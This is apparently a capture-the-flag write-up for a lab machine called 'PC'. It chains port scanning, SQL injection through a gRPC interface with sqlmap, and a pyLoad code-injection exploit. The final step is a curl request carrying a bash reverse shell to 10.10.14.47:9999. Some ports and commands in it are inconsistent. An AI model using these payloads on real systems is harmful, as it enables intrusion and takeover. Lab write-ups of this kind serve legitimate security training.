THE MACHINE IS PC 

TOOLS USED:

NMAP
GRPCUI
SQLMAP


for frist thing we run the nmap for know the ports active, but not olso the first 1024 but all. 
whit this command:

	nmap -p- -Pn IPMACHINE

we find there is two port avible the 22(ssh) and 50053(unknow), serch on internet are find che 50053 is port for gRPC. So we sarch a UI for utiliz this framework and on github we find thet.   

install that: 

	go install github.com/fullstorydev/grpcui/cmd/grpcui@latest

run the program:

	go run ./cmd/grpcui/grpcui.go -plaintext localhost:9019 

after that we open the UI and do this pass: register on the pannel and do the login, take your id and token, go the on the info and insert it. take the request for info and save on file because after this ,we do a sql injaction whit id 

for do this we will use a tool called sqlmap

for first thing we modify che file of request and insert afer the number id this "*" for signal where the sql injaction are start.

After that we run sqlmap with this command: 


	sqlmap -r --bach request.req

it worked , now we can see the credentials for login on ssh of simple user,  name called sau.

login whit it and on the file user , we can find the firt flag.


Now the need  do escalate our privilage. For do that , we use another tool called linepas. run this on the machine for extract the information for possible privialge escalation. 

in the section port, can see there is more ports not open outside like the port 8000 used by pyLoad.

search on in internet the possible exploit for it and we find it, the exploit use the command curl to send a request post where on payload you can insert a executable command by root. so insert reverse shell on the payload , open whit nc to put the machine in listen. the command is this 

	curl -i -s -k -X $'POST' -H $'Host: 127.0.0.1:9000' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary 	$'package=xxx&crypted=AAAA&jk=pyimport+os%3bos.system("/bin/bash+-c+%27bash+-i+>%26+/dev/tcp/10.10.14.47/9999+0>%261%27");f=function%	20f2(){};&passwords=aaaa' $'http://127.0.0.1:9000/flash/addcrypted2'



now we have the root permmision and inside of a file called root.txt you find the last flag.


